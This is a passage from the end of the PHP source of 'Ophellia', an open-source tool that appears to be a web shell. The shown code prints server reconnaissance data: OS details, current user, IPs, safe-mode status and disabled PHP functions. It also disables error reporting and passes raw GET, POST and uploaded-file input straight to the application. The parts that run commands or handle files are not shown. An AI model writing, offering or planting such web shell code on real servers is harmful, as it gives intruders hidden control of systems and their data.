            "System" => php_uname('a') . " " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A'),
            "User" => function_exists('get_current_user') ? get_current_user() : 'N/A',
            "Free Space" => $freeSpace,
            "Server IP" => gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost'),
            "Client IP" => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
            "Safe Mode" => $safeMode,
            "PHP Version" => phpversion(),
            "Disabled Functions" => $disableFunctions,
        ];

        echo "<section class='tool-section'>";
        echo "<h2>System Information</h2>";
        echo "<div class='info-table'>";
        foreach ($infoItems as $key => $value) {
            echo "<div class='info-row'>";
            echo "<div class='info-key'>" . htmlspecialchars($key) . "</div>";
            echo "<div class='info-value'>" . htmlspecialchars($value) . "</div>";
            echo "</div>";
        }
        echo "</div>";
        echo "</section>";
    }

    private function showFooter(): void
    {
        echo '</main>
            <footer>
                <p><a href="//rei.my.id">@elliottophellia</a><br/>Copyright &copy; 2022 - ' . date('Y') . ' <a href="//github.com/elliottophellia/ophellia">Ophellia</a>.<br/><a href="//github.com/elliottophellia/ophellia">Ophellia</a> are free and open source software distributed under the GNU General Public License.</p>
            </footer>
        <script>
        document.addEventListener("DOMContentLoaded", function() {
            const hamburger = document.querySelector(".hamburger");
            const navMenu = document.querySelector(".nav-menu");

            hamburger.addEventListener("click", function() {
                navMenu.classList.toggle("show");
            });

            // Close the menu when clicking outside
            document.addEventListener("click", function(event) {
                if (!navMenu.contains(event.target) && !hamburger.contains(event.target)) {
                    navMenu.classList.remove("show");
                }
            });
        });
        </script>
        </body>
        </html>';
    }
}

session_start();
error_reporting(0);
ini_set('display_errors', '0');
header('X-Powered-By: Ophellia v' . VERSION);

try {
    $app = new Elliottophellia($_GET, $_POST, $_FILES);
    $app->run();
} catch (Throwable $e) {
    $errorMessage = 'Caught exception: ' . $e->getMessage() . "\n" . $e->getTraceAsString();
    echo "<p>An error occurred. Please check the browser console for more details.</p><script>console.error(" . json_encode($errorMessage) . ");</script>";
}
